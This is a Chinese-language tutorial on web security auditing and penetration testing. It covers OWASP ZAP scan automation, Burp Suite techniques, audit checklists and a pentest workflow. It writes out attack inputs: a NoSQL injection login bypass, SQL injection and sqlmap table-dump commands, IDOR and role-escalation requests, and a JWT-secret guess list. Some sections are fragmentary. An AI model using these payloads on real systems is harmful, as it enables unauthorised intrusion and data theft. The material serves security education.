## 📚 知识导读

### 安全审计 vs 渗透测试

```
┌─────────────────────────────────────────────────────┐
│  安全审计（Security Audit）                          │
├─────────────────────────────────────────────────────┤
│  - 检查配置、代码、流程是否符合安全标准              │
│  - 使用清单（Checklist）逐项检查                    │
│  - 目标：发现潜在风险、确保合规                      │
│  - 工具：代码扫描、配置检查                          │
└─────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────┐
│  渗透测试（Penetration Testing）                     │
├─────────────────────────────────────────────────────┤
│  - 模拟黑客攻击，主动寻找漏洞                        │
│  - 尝试利用漏洞获取权限                              │
│  - 目标：发现可被利用的漏洞                          │
│  - 工具：OWASP ZAP、Burp Suite、Metasploit          │
└─────────────────────────────────────────────────────┘
```

### 2. 自动扫描（Quick Start）

**步骤：**
1. 启动 ZAP
2. 选择 "Automated Scan"
3. 输入目标 URL：`http://localhost:3000`
4. 点击 "Attack"

**扫描过程：**
```
1. Spider（爬虫）：发现所有页面和端点
   ├─ GET /
   ├─ GET /api/users
   ├─ POST /api/login
   └─ ...

2. Active Scan（主动扫描）：测试每个端点的漏洞
   ├─ SQL 注入
   ├─ XSS
   ├─ CSRF
   └─ ...

3. 生成报告
```

### 3. 被动扫描（Passive Scan）

```javascript
// 配置 Node.js 应用使用 ZAP 代理
import fetch from 'node-fetch';
import { HttpsProxyAgent } from 'https-proxy-agent';

const proxyAgent = new HttpsProxyAgent('http://localhost:8080');

// 所有请求通过 ZAP 代理
const response = await fetch('https://api.example.com', {
  agent: proxyAgent,
});

// ZAP 会被动分析所有流量
```

**被动扫描检测项：**
- 缺少安全响应头（X-Frame-Options、CSP）
- Cookie 未设置 HttpOnly/Secure
- 敏感信息泄露（Stack Trace、版本号）
- 混合内容（HTTP + HTTPS）

### 4. ZAP API 自动化

```bash
# 启动 ZAP Daemon（后台模式）
zap.sh -daemon -host 0.0.0.0 -port 8080 -config api.key=your-api-key
```

```javascript
// zap-scan.js
import fetch from 'node-fetch';

const ZAP_API = 'http://localhost:8080';
const API_KEY = 'your-api-key';
const TARGET = 'http://localhost:3000';

async function zapScan() {
  // 1. 访问目标（触发被动扫描）
  await fetch(`${ZAP_API}/JSON/core/action/accessUrl/?url=${TARGET}&apikey=${API_KEY}`);

  // 2. Spider 扫描
  const spiderScan = await fetch(
    `${ZAP_API}/JSON/spider/action/scan/?url=${TARGET}&apikey=${API_KEY}`
  ).then((r) => r.json());

  const spiderScanId = spiderScan.scan;

  // 等待 Spider 完成
  let spiderProgress = 0;
  while (spiderProgress < 100) {
    const status = await fetch(
      `${ZAP_API}/JSON/spider/view/status/?scanId=${spiderScanId}&apikey=${API_KEY}`
    ).then((r) => r.json());

    spiderProgress = parseInt(status.status, 10);
    console.log(`Spider progress: ${spiderProgress}%`);
    await new Promise((resolve) => setTimeout(resolve, 2000));
  }

  // 3. Active Scan（主动扫描）
  const activeScan = await fetch(
    `${ZAP_API}/JSON/ascan/action/scan/?url=${TARGET}&apikey=${API_KEY}`
  ).then((r) => r.json());

  const scanId = activeScan.scan;

  // 等待扫描完成
  let scanProgress = 0;
  while (scanProgress < 100) {
    const status = await fetch(
      `${ZAP_API}/JSON/ascan/view/status/?scanId=${scanId}&apikey=${API_KEY}`
    ).then((r) => r.json());

    scanProgress = parseInt(status.status, 10);
    console.log(`Active scan progress: ${scanProgress}%`);
    await new Promise((resolve) => setTimeout(resolve, 5000));
  }

  // 4. 获取警报（漏洞）
  const alerts = await fetch(
    `${ZAP_API}/JSON/core/view/alerts/?baseurl=${TARGET}&apikey=${API_KEY}`
  ).then((r) => r.json());

  console.log(`Found ${alerts.alerts.length} vulnerabilities`);

  // 按严重程度分类
  const highRisk = alerts.alerts.filter((a) => a.risk === 'High');
  const mediumRisk = alerts.alerts.filter((a) => a.risk === 'Medium');
  const lowRisk = alerts.alerts.filter((a) => a.risk === 'Low');

  console.log(`High: ${highRisk.length}, Medium: ${mediumRisk.length}, Low: ${lowRisk.length}`);

  // 5. 生成 HTML 报告
  const report = await fetch(
    `${ZAP_API}/OTHER/core/other/htmlreport/?apikey=${API_KEY}`
  ).then((r) => r.text());

  await fs.writeFile('zap-report.html', report);
  console.log('Report saved to zap-report.html');
}

zapScan();
```

```yaml
      - name: Start application

          cmd_options: '-a'

      - name: Upload ZAP Report
        uses: actions/upload-artifact@v3
        with:
          name: zap-report
```

### 4. Repeater（重放攻击）

**步骤：**
1. 右键请求 → Send to Repeater
2. 在 Repeater 中修改请求
3. 点击 "Send" 查看响应
4. 快速测试不同 Payload

**示例：测试 NoSQL 注入**

```json
// 原始请求
POST /api/login HTTP/1.1
Content-Type: application/json

{
  "username": "admin",
  "password": "password123"
}

// 修改为 NoSQL 注入
{
  "username": "admin",
  "password": { "$ne": null }
}

// 观察响应
HTTP/1.1 200 OK
{ "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." }
```

### 5. Intruder（暴力破解）

**场景：爆破 JWT 密钥**

```
1. 拦截包含 JWT 的请求
2. Send to Intruder
3. 设置 Payload Positions

┌─────────────────────────────────────────────────────┐
│  GET /api/profile HTTP/1.1                          │
│  Authorization: Bearer §eyJhbGc...§                 │
│                        ↑       ↑                    │
│                      Attack Position                │
└─────────────────────────────────────────────────────┘

4. 设置 Payload（密钥字典）
   - password
   - secret
   - jwt_secret
   - my_secret_key
   - ...

5. 开始攻击
6. 分析响应状态码（200 = 成功）
```

## 🎯 安全审计清单

### 1. 认证授权审计

```
✅ 密码策略
   - 最小长度 12 字符
   - 包含大小写字母、数字、特殊符号
   - 使用 bcrypt/Argon2 哈希

✅ JWT 安全
   - 短期有效期（≤15 分钟）
   - HTTPS 传输
   - httpOnly Cookie 存储
   - 刷新令牌轮换

✅ 会话管理
   - 登出后会话失效
   - 并发会话限制
   - 闲置超时

✅ 多因素认证（MFA）
   - 敏感操作强制 2FA
   - 备用恢复码

✅ 权限控制
   - RBAC/ABAC 实现
   - 最小权限原则
   - 资源所有权检查
```

---

### 2. 输入验证审计

```
✅ 前后端验证
   - 后端必须验证所有输入
   - 不信任客户端验证

✅ 类型验证
   - 使用 Joi/Yup 验证
   - 严格类型检查

✅ 白名单过滤
   - 允许列表 > 拒绝列表
   - 正则表达式验证

✅ 长度限制
   - 字符串最大长度
   - 数组/对象最大元素数

✅ 文件上传
   - MIME 类型检查
   - 文件大小限制
   - 文件扩展名白名单
```

---

### 3. 加密传输审计

```
✅ HTTPS 配置
   - 强制 HTTPS
   - TLS 1.3
   - HSTS 响应头

✅ 证书有效性
   - 未过期
   - 受信任的 CA
   - 正确的域名

✅ 加密套件
   - 禁用弱加密（RC4、DES）
   - 优先使用 ECDHE + AES-GCM

✅ 安全响应头
   - Strict-Transport-Security
   - X-Frame-Options
   - X-Content-Type-Options
   - Content-Security-Policy
```

## 🎯 渗透测试流程

### 1. 信息收集（Reconnaissance）

```bash
# 端口扫描（nmap）

# 输出
# PORT     STATE SERVICE VERSION
# 22/tcp   open  ssh     OpenSSH 8.2p1
# 80/tcp   open  http    nginx 1.18.0
# 3000/tcp open  http    Node.js Express

# 子域名枚举
subfinder -d example.com

# 目录爆破
gobuster dir -u http://localhost:3000 -w /usr/share/wordlists/dirb/common.txt

# 技术栈识别
whatweb http://localhost:3000
# Node.js, Express, MongoDB
```

### 3. 漏洞利用（Exploitation）

**示例：SQL 注入**

```bash
# 手动测试
curl "http://localhost:3000/api/users?id=1' OR '1'='1"

# 使用 SQLMap
sqlmap -u "http://localhost:3000/api/users?id=1" --dbs

# 输出
# available databases [3]:
# [*] information_schema
# [*] mysql
# [*] myapp

# 提取数据
sqlmap -u "http://localhost:3000/api/users?id=1" -D myapp --tables

# 输出
# [*] users
# [*] orders
# [*] admin_users  ← 发现敏感表

sqlmap -u "http://localhost:3000/api/users?id=1" -D myapp -T admin_users --dump

# 输出
# +----+----------+----------------------------------+
# | id | username | password                         |
# +----+----------+----------------------------------+
# | 1  | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 |  # MD5（已破解）
# +----+----------+----------------------------------+
```

---

### 4. 权限提升（Privilege Escalation）

```bash
# 场景：获取普通用户权限后，尝试提升到管理员

# 1. 测试 IDOR（不安全的直接对象引用）
curl -H "Authorization: Bearer USER_TOKEN" \
  http://localhost:3000/api/users/1

# 如果返回管理员信息 → IDOR 漏洞

# 2. 测试越权
curl -X PUT -H "Authorization: Bearer USER_TOKEN" \
  -d '{"role": "admin"}' \
  http://localhost:3000/api/users/123

# 如果成功 → 垂直越权漏洞
```

### 错误 1：生产环境直接测试


### 错误 2：忽略低危漏洞

```
# ❌ 错误思维
"只是缺少安全响应头，不重要"

# ✅ 正确思维
低危漏洞 + 低危漏洞 = 可被组合利用
例如：XSS + 缺少 CSP = 高危
```

## 📚 FAQ

### 1. 如何合法地进行渗透测试？

**要求：**
1. **书面授权**：获得目标方的授权书
2. **测试范围**：明确可测试的 IP/域名
3. **测试时间**：约定测试窗口
4. **保密协议**：签署 NDA
5. **禁止行为**：禁止破坏数据、DoS 攻击

### 2. 渗透测试工具推荐

| 工具 | 用途 | 难度 |
|------|------|------|
| **OWASP ZAP** | 自动扫描 | ⭐ |
| **Burp Suite** | 手动测试 | ⭐⭐ |
| **SQLMap** | SQL 注入 | ⭐⭐ |
| **Metasploit** | 漏洞利用 | ⭐⭐⭐ |
| **Nmap** | 端口扫描 | ⭐ |

### 3. 如何学习渗透测试？

**学习路径：**
1. 学习 OWASP Top 10
2. 搭建靶场（DVWA、WebGoat）
3. 练习平台（HackTheBox、TryHackMe）
4. 考取证书（CEH、OSCP）
